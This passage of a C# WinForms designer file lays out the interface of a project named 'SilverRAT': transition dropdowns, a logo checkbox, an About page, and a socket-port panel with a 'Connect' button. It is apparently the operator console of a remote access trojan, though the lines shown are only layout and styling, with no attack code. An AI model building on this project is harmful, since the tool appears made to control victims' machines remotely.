        this.TransitionOut.ItemForeColor = System.Drawing.Color.Black;
        this.TransitionOut.ItemHeight = 20;
        this.TransitionOut.ItemHighLightColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.TransitionOut.ItemHighLightForeColor = System.Drawing.Color.White;
        this.TransitionOut.Items.AddRange(new object[] {
            "Custom",
            "Rotate",
            "HorizSlide",
            "VertSlide",
            "Scale",
            "ScaleAndRotate",
            "HorizSlideAndRotate",
            "ScaleAndHorizSlide",
            "Transparent",
            "Leaf",
            "Mosaic",
            "Particles",
            "VertBlind",
            "HorizBlind"});
        this.TransitionOut.ItemTopMargin = 3;
        this.TransitionOut.Location = new System.Drawing.Point(156, 65);
        this.TransitionOut.Name = "TransitionOut";
        this.TransitionOut.Size = new System.Drawing.Size(120, 26);
        this.TransitionOut.TabIndex = 619;
        this.TransitionOut.Text = null;
        this.TransitionOut.TextAlignment = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.TransitionOut.TextLeftMargin = 5;
        this.TransitionOut.SelectedIndexChanged += new System.EventHandler(this.TransitionOut_SelectedIndexChanged);
        // 
        // EnableLogo
        // 
        this.EnableLogo.AllowBindingControlAnimation = true;
        this.EnableLogo.AllowBindingControlColorChanges = false;
        this.EnableLogo.AllowBindingControlLocation = true;
        this.EnableLogo.AllowCheckBoxAnimation = true;
        this.EnableLogo.AllowCheckmarkAnimation = true;
        this.EnableLogo.AllowOnHoverStates = true;
        this.EnableLogo.AutoCheck = true;
        this.EnableLogo.BackColor = System.Drawing.Color.Transparent;
        this.EnableLogo.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("EnableLogo.BackgroundImage")));
        this.EnableLogo.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.EnableLogo.BindingControl = this.TxLogo;
        this.EnableLogo.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.EnableLogo.BorderRadius = 6;
        this.EnableLogo.Checked = false;
        this.EnableLogo.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.EnableLogo.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnableLogo.CustomCheckmarkImage = null;
        this.EnableLogo.Location = new System.Drawing.Point(20, 250);
        this.EnableLogo.MinimumSize = new System.Drawing.Size(17, 17);
        this.EnableLogo.Name = "EnableLogo";
        this.EnableLogo.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableLogo.OnCheck.BorderRadius = 6;
        this.EnableLogo.OnCheck.BorderThickness = 2;
        this.EnableLogo.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableLogo.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.EnableLogo.OnCheck.CheckmarkThickness = 2;
        this.EnableLogo.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.EnableLogo.OnDisable.BorderRadius = 6;
        this.EnableLogo.OnDisable.BorderThickness = 2;
        this.EnableLogo.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnableLogo.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.EnableLogo.OnDisable.CheckmarkThickness = 2;
        this.EnableLogo.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnableLogo.OnHoverChecked.BorderRadius = 6;
        this.EnableLogo.OnHoverChecked.BorderThickness = 2;
        this.EnableLogo.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableLogo.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.EnableLogo.OnHoverChecked.CheckmarkThickness = 2;
        this.EnableLogo.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnableLogo.OnHoverUnchecked.BorderRadius = 6;
        this.EnableLogo.OnHoverUnchecked.BorderThickness = 1;
        this.EnableLogo.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnableLogo.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.EnableLogo.OnUncheck.BorderRadius = 6;
        this.EnableLogo.OnUncheck.BorderThickness = 1;
        this.EnableLogo.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.EnableLogo.Size = new System.Drawing.Size(21, 21);
        this.EnableLogo.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.EnableLogo.TabIndex = 635;
        this.EnableLogo.ThreeState = false;
        this.EnableLogo.ToolTipText = null;
        this.EnableLogo.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(this.EnableLogo_CheckedChanged);
        // 
        // TxLogo
        // 
        this.TxLogo.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxLogo.AutoSize = true;
        this.TxLogo.BackColor = System.Drawing.Color.Transparent;
        this.TxLogo.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxLogo.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxLogo.ForeColor = System.Drawing.Color.Black;
        this.TxLogo.Location = new System.Drawing.Point(44, 254);
        this.TxLogo.Name = "TxLogo";
        this.TxLogo.Size = new System.Drawing.Size(72, 15);
        this.TxLogo.TabIndex = 634;
        this.TxLogo.Text = "Enable Logo";
        // 
        // TransitionLogin
        // 
        this.TransitionLogin.BackColor = System.Drawing.Color.Transparent;
        this.TransitionLogin.BackgroundColor = System.Drawing.Color.White;
        this.TransitionLogin.BorderColor = System.Drawing.Color.Silver;
        this.TransitionLogin.BorderRadius = 1;
        this.TransitionLogin.Color = System.Drawing.Color.Silver;
        this.TransitionLogin.Direction = Bunifu.UI.WinForms.BunifuDropdown.Directions.Down;
        this.TransitionLogin.DisabledBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        this.TransitionLogin.DisabledBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.TransitionLogin.DisabledColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        this.TransitionLogin.DisabledForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        this.TransitionLogin.DisabledIndicatorColor = System.Drawing.Color.DarkGray;
        this.TransitionLogin.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
        this.TransitionLogin.DropdownBorderThickness = Bunifu.UI.WinForms.BunifuDropdown.BorderThickness.Thin;
        this.TransitionLogin.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.TransitionLogin.DropDownTextAlign = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.TransitionLogin.FillDropDown = true;
        this.TransitionLogin.FillIndicator = false;
        this.TransitionLogin.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
        this.TransitionLogin.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TransitionLogin.ForeColor = System.Drawing.Color.Black;
        this.TransitionLogin.FormattingEnabled = true;
        this.TransitionLogin.Icon = null;
        this.TransitionLogin.IndicatorAlignment = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.TransitionLogin.IndicatorColor = System.Drawing.Color.DarkGray;
        this.TransitionLogin.IndicatorLocation = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.TransitionLogin.IndicatorThickness = 2;
        this.TransitionLogin.IsDropdownOpened = false;
        this.TransitionLogin.ItemBackColor = System.Drawing.Color.White;
        this.TransitionLogin.ItemBorderColor = System.Drawing.Color.White;
        this.TransitionLogin.ItemForeColor = System.Drawing.Color.Black;
        this.TransitionLogin.ItemHeight = 20;
        this.TransitionLogin.ItemHighLightColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.TransitionLogin.ItemHighLightForeColor = System.Drawing.Color.White;
        this.TransitionLogin.Items.AddRange(new object[] {
            "Custom",
            "Rotate",
            "HorizSlide",
            "VertSlide",
            "Scale",
            "ScaleAndRotate",
            "HorizSlideAndRotate",
            "ScaleAndHorizSlide",
            "Transparent",
            "Leaf",
            "Mosaic",
            "Particles",
            "VertBlind",
            "HorizBlind"});
        this.TransitionLogin.ItemTopMargin = 3;
        this.TransitionLogin.Location = new System.Drawing.Point(20, 65);
        this.TransitionLogin.Name = "TransitionLogin";
        this.TransitionLogin.Size = new System.Drawing.Size(120, 26);
        this.TransitionLogin.TabIndex = 618;
        this.TransitionLogin.Text = null;
        this.TransitionLogin.TextAlignment = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.TransitionLogin.TextLeftMargin = 5;
        this.TransitionLogin.SelectedIndexChanged += new System.EventHandler(this.TransitionLogin_SelectedIndexChanged);
        // 
        // bunifuLabel6
        // 
        this.bunifuLabel6.AllowParentOverrides = false;
        this.bunifuLabel6.AutoEllipsis = false;
        this.bunifuLabel6.AutoSize = false;
        this.bunifuLabel6.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel6.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel6.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.bunifuLabel6.ForeColor = System.Drawing.Color.Gray;
        this.bunifuLabel6.Location = new System.Drawing.Point(8, 15);
        this.bunifuLabel6.Name = "bunifuLabel6";
        this.bunifuLabel6.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel6.Size = new System.Drawing.Size(378, 17);
        this.bunifuLabel6.TabIndex = 568;
        this.bunifuLabel6.Text = "Pages Transition Settings";
        this.bunifuLabel6.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.bunifuLabel6.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // Page7
        // 
        this.Page7.BackColor = System.Drawing.Color.White;
        this.Page7.Controls.Add(this.PanelAbout);
        this.Page7.Location = new System.Drawing.Point(4, 4);
        this.Page7.Name = "Page7";
        this.Page7.Size = new System.Drawing.Size(944, 487);
        this.Page7.TabIndex = 6;
        this.Page7.Text = "PageAbout";
        // 
        // PanelAbout
        // 
        this.PanelAbout.Controls.Add(this.pictureBox3);
        this.PanelAbout.Dock = System.Windows.Forms.DockStyle.Fill;
        this.PanelAbout.Location = new System.Drawing.Point(0, 0);
        this.PanelAbout.Name = "PanelAbout";
        this.PanelAbout.Size = new System.Drawing.Size(944, 487);
        this.PanelAbout.TabIndex = 1;
        this.PanelAbout.Visible = false;
        // 
        // pictureBox3
        // 
        this.pictureBox3.Dock = System.Windows.Forms.DockStyle.Fill;
        this.pictureBox3.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox3.Image")));
        this.pictureBox3.Location = new System.Drawing.Point(0, 0);
        this.pictureBox3.Name = "pictureBox3";
        this.pictureBox3.Size = new System.Drawing.Size(944, 487);
        this.pictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.pictureBox3.TabIndex = 609;
        this.pictureBox3.TabStop = false;
        // 
        // PageSocketPort
        // 
        this.PageSocketPort.Controls.Add(this.PanelButtonPort);
        this.PageSocketPort.Controls.Add(this.bunifuShadowPanel2);
        this.PageSocketPort.Location = new System.Drawing.Point(4, 4);
        this.PageSocketPort.Name = "PageSocketPort";
        this.PageSocketPort.Size = new System.Drawing.Size(944, 487);
        this.PageSocketPort.TabIndex = 7;
        this.PageSocketPort.Text = "PageSocketPort";
        this.PageSocketPort.UseVisualStyleBackColor = true;
        // 
        // PanelButtonPort
        // 
        this.PanelButtonPort.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
        this.PanelButtonPort.Controls.Add(this.StartPort);
        this.PanelButtonPort.Location = new System.Drawing.Point(801, 435);
        this.PanelButtonPort.Name = "PanelButtonPort";
        this.PanelButtonPort.Size = new System.Drawing.Size(121, 39);
        this.PanelButtonPort.TabIndex = 643;
        // 
        // StartPort
        // 
        this.StartPort.Animated = true;
        this.StartPort.BorderRadius = 8;
        this.StartPort.CheckedState.Parent = this.StartPort;
        this.StartPort.CustomImages.Parent = this.StartPort;
        this.StartPort.FillColor = System.Drawing.Color.Green;
        this.StartPort.FillColor2 = System.Drawing.Color.Green;
        this.StartPort.Font = new System.Drawing.Font("Consolas", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.StartPort.ForeColor = System.Drawing.Color.White;
        this.StartPort.HoverState.Parent = this.StartPort;
        this.StartPort.Location = new System.Drawing.Point(3, 3);
        this.StartPort.Name = "StartPort";
        this.StartPort.ShadowDecoration.Parent = this.StartPort;
        this.StartPort.Size = new System.Drawing.Size(116, 33);
        this.StartPort.TabIndex = 642;
        this.StartPort.Text = "Connect";
        this.StartPort.Click += new System.EventHandler(this.StartPort_Click);
        // 
        // bunifuShadowPanel2
        // 
        this.bunifuShadowPanel2.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.bunifuShadowPanel2.BackColor = System.Drawing.Color.White;
        this.bunifuShadowPanel2.BorderColor = System.Drawing.Color.White;
        this.bunifuShadowPanel2.BorderRadius = 20;
        this.bunifuShadowPanel2.BorderThickness = 1;
        this.bunifuShadowPanel2.Controls.Add(this.bunifuLabel4);
        this.bunifuShadowPanel2.Controls.Add(this.TextSocketPort);
        this.bunifuShadowPanel2.Controls.Add(this.CountPort);
        this.bunifuShadowPanel2.Controls.Add(this.ListSocketPort);
        this.bunifuShadowPanel2.FillStyle = Bunifu.UI.WinForms.BunifuShadowPanel.FillStyles.Solid;
        this.bunifuShadowPanel2.GradientMode = Bunifu.UI.WinForms.BunifuShadowPanel.GradientModes.Vertical;
        this.bunifuShadowPanel2.Location = new System.Drawing.Point(287, 67);
        this.bunifuShadowPanel2.Name = "bunifuShadowPanel2";
        this.bunifuShadowPanel2.PanelColor = System.Drawing.Color.White;
        this.bunifuShadowPanel2.PanelColor2 = System.Drawing.Color.White;
        this.bunifuShadowPanel2.ShadowColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
        this.bunifuShadowPanel2.ShadowDept = 2;
        this.bunifuShadowPanel2.ShadowDepth = 5;
        this.bunifuShadowPanel2.ShadowStyle = Bunifu.UI.WinForms.BunifuShadowPanel.ShadowStyles.Surrounded;
        this.bunifuShadowPanel2.ShadowTopLeftVisible = false;
        this.bunifuShadowPanel2.Size = new System.Drawing.Size(383, 338);
        this.bunifuShadowPanel2.Style = Bunifu.UI.WinForms.BunifuShadowPanel.BevelStyles.Flat;
        this.bunifuShadowPanel2.TabIndex = 564;
        // 
        // bunifuLabel4
        // 
        this.bunifuLabel4.AllowParentOverrides = false;
        this.bunifuLabel4.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.bunifuLabel4.AutoEllipsis = false;
        this.bunifuLabel4.AutoSize = false;
        this.bunifuLabel4.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel4.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel4.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.bunifuLabel4.ForeColor = System.Drawing.Color.Gray;
        this.bunifuLabel4.Location = new System.Drawing.Point(14, 17);
        this.bunifuLabel4.Name = "bunifuLabel4";
        this.bunifuLabel4.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel4.Size = new System.Drawing.Size(355, 17);
        this.bunifuLabel4.TabIndex = 602;
        this.bunifuLabel4.Text = "Ports Socket";
        this.bunifuLabel4.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.bunifuLabel4.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // TextSocketPort
        // 
        this.TextSocketPort.AcceptsReturn = false;
        this.TextSocketPort.AcceptsTab = false;
        this.TextSocketPort.AnimationSpeed = 200;
        this.TextSocketPort.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.TextSocketPort.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.TextSocketPort.AutoSizeHeight = true;
        this.TextSocketPort.BackColor = System.Drawing.Color.Transparent;
        this.TextSocketPort.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("TextSocketPort.BackgroundImage")));
        this.TextSocketPort.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.TextSocketPort.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.TextSocketPort.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.TextSocketPort.BorderColorIdle = System.Drawing.Color.Silver;
        this.TextSocketPort.BorderRadius = 10;
        this.TextSocketPort.BorderThickness = 1;
        this.TextSocketPort.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.TextSocketPort.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.TextSocketPort.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.TextSocketPort.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.TextSocketPort.DefaultText = "";
        this.TextSocketPort.FillColor = System.Drawing.Color.White;
        this.TextSocketPort.HideSelection = true;
        this.TextSocketPort.IconLeft = ((System.Drawing.Image)(resources.GetObject("TextSocketPort.IconLeft")));
        this.TextSocketPort.IconLeftCursor = System.Windows.Forms.Cursors.Hand;
        this.TextSocketPort.IconPadding = 3;
        this.TextSocketPort.IconRight = global::SilverRAT.Properties.Resources.IconAdd;
        this.TextSocketPort.IconRightCursor = System.Windows.Forms.Cursors.Hand;
        this.TextSocketPort.Lines = new string[0];
        this.TextSocketPort.Location = new System.Drawing.Point(14, 56);
        this.TextSocketPort.MaxLength = 32767;
        this.TextSocketPort.MinimumSize = new System.Drawing.Size(1, 1);
        this.TextSocketPort.Modified = false;
        this.TextSocketPort.Multiline = false;
        this.TextSocketPort.Name = "TextSocketPort";
        stateProperties121.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties121.FillColor = System.Drawing.Color.Empty;
        stateProperties121.ForeColor = System.Drawing.Color.Empty;
        stateProperties121.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextSocketPort.OnActiveState = stateProperties121;
        stateProperties122.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties122.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties122.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties122.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.TextSocketPort.OnDisabledState = stateProperties122;
        stateProperties123.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties123.FillColor = System.Drawing.Color.Empty;
        stateProperties123.ForeColor = System.Drawing.Color.Empty;
        stateProperties123.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextSocketPort.OnHoverState = stateProperties123;
        stateProperties124.BorderColor = System.Drawing.Color.Silver;
        stateProperties124.FillColor = System.Drawing.Color.White;
        stateProperties124.ForeColor = System.Drawing.Color.Empty;
        stateProperties124.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextSocketPort.OnIdleState = stateProperties124;
        this.TextSocketPort.Padding = new System.Windows.Forms.Padding(3);
        this.TextSocketPort.PasswordChar = '\0';
        this.TextSocketPort.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.TextSocketPort.PlaceholderText = "Port";
        this.TextSocketPort.ReadOnly = false;
        this.TextSocketPort.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.TextSocketPort.SelectedText = "";
        this.TextSocketPort.SelectionLength = 0;
        this.TextSocketPort.SelectionStart = 0;
        this.TextSocketPort.ShortcutsEnabled = true;
        this.TextSocketPort.Size = new System.Drawing.Size(352, 28);
        this.TextSocketPort.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.TextSocketPort.TabIndex = 601;
        this.TextSocketPort.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.TextSocketPort.TextMarginBottom = 0;
        this.TextSocketPort.TextMarginLeft = 3;
        this.TextSocketPort.TextMarginTop = 1;
        this.TextSocketPort.TextPlaceholder = "Port";
        this.TextSocketPort.UseSystemPasswordChar = false;
        this.TextSocketPort.WordWrap = true;
        this.TextSocketPort.OnIconLeftClick += new System.EventHandler(this.TextSocketPort_OnIconLeftClick);
        this.TextSocketPort.OnIconRightClick += new System.EventHandler(this.TextSocketPort_OnIconRightClick);
        this.TextSocketPort.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.TextSocketPort_KeyPress);
        // 
        // CountPort
        // 
        this.CountPort.AllowParentOverrides = false;
        this.CountPort.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.CountPort.AutoEllipsis = false;
        this.CountPort.AutoSize = false;
        this.CountPort.Cursor = System.Windows.Forms.Cursors.Default;
        this.CountPort.CursorType = System.Windows.Forms.Cursors.Default;
        this.CountPort.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.CountPort.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(192)))), ((int)(((byte)(0)))));
        this.CountPort.Location = new System.Drawing.Point(14, 90);
        this.CountPort.Name = "CountPort";
        this.CountPort.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.CountPort.Size = new System.Drawing.Size(356, 17);
        this.CountPort.TabIndex = 568;
        this.CountPort.Text = "...";
        this.CountPort.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
        this.CountPort.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // ListSocketPort
        // 
        this.ListSocketPort.AllowUserToAddRows = false;
        this.ListSocketPort.AllowUserToDeleteRows = false;
        this.ListSocketPort.AllowUserToResizeColumns = false;
        this.ListSocketPort.AllowUserToResizeRows = false;
        dataGridViewCellStyle21.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(247)))), ((int)(((byte)(248)))), ((int)(((byte)(249)))));
        this.ListSocketPort.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle21;
        this.ListSocketPort.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
        | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.ListSocketPort.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
        this.ListSocketPort.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListSocketPort.BackgroundColor = System.Drawing.Color.White;
        this.ListSocketPort.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListSocketPort.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListSocketPort.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListSocketPort.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle22.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle22.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(232)))), ((int)(((byte)(234)))), ((int)(((byte)(237)))));
        dataGridViewCellStyle22.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        dataGridViewCellStyle22.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle22.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(232)))), ((int)(((byte)(234)))), ((int)(((byte)(237)))));
        dataGridViewCellStyle22.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle22.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListSocketPort.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle22;
        this.ListSocketPort.ColumnHeadersHeight = 30;
        this.ListSocketPort.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListSocketPort.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewTextBoxColumn3});
        dataGridViewCellStyle24.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle24.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle24.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        dataGridViewCellStyle24.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle24.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(239)))), ((int)(((byte)(241)))), ((int)(((byte)(243)))));
        dataGridViewCellStyle24.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle24.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListSocketPort.DefaultCellStyle = dataGridViewCellStyle24;
        this.ListSocketPort.EnableHeadersVisualStyles = false;
        this.ListSocketPort.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(245)))), ((int)(((byte)(247)))));
        this.ListSocketPort.Location = new System.Drawing.Point(5, 118);
        this.ListSocketPort.Name = "ListSocketPort";
        this.ListSocketPort.ReadOnly = true;
        this.ListSocketPort.RowHeadersVisible = false;
        this.ListSocketPort.RowHeadersWidth = 27;
        this.ListSocketPort.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListSocketPort.ShowCellErrors = false;
        this.ListSocketPort.ShowEditingIcon = false;
        this.ListSocketPort.ShowRowErrors = false;
        this.ListSocketPort.Size = new System.Drawing.Size(373, 188);
        this.ListSocketPort.TabIndex = 485;
        this.ListSocketPort.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListSocketPort.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(247)))), ((int)(((byte)(248)))), ((int)(((byte)(249)))));
        this.ListSocketPort.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListSocketPort.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListSocketPort.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListSocketPort.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListSocketPort.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListSocketPort.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(245)))), ((int)(((byte)(247)))));
        this.ListSocketPort.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(232)))), ((int)(((byte)(234)))), ((int)(((byte)(237)))));
        this.ListSocketPort.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListSocketPort.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        this.ListSocketPort.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListSocketPort.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListSocketPort.ThemeStyle.HeaderStyle.Height = 30;
        this.ListSocketPort.ThemeStyle.ReadOnly = true;
        this.ListSocketPort.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListSocketPort.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListSocketPort.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        this.ListSocketPort.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListSocketPort.ThemeStyle.RowsStyle.Height = 22;
        this.ListSocketPort.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(239)))), ((int)(((byte)(241)))), ((int)(((byte)(243)))));
